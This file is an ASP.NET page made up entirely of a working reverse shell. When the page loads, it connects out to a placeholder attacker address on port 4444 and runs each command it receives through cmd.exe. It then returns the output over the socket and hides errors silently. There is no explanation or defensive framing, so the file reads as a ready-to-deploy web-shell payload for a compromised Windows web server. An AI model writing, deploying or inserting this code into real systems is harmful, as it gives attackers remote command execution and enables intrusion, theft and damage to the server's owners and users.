<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string host = "ATTACKER_IP";
    int port = 4444;
    
    try
    {
        TcpClient client = new TcpClient();
        client.Connect(host, port);
        NetworkStream stream = client.GetStream();
        
        byte[] buffer = new byte[4096];
        int bytesRead;
        
        while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
        {
            string cmd = Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim();
            if (cmd.ToLower() == "exit") break;
            
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                var p = Process.Start(psi);
                string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                p.WaitForExit();
                
                byte[] outBytes = Encoding.ASCII.GetBytes(output);
                stream.Write(outBytes, 0, outBytes.Length);
            }
            catch (Exception ex)
            {
                byte[] err = Encoding.ASCII.GetBytes(ex.Message);
                stream.Write(err, 0, err.Length);
            }
        }
        
        client.Close();
    }
    catch { }
}
</script>
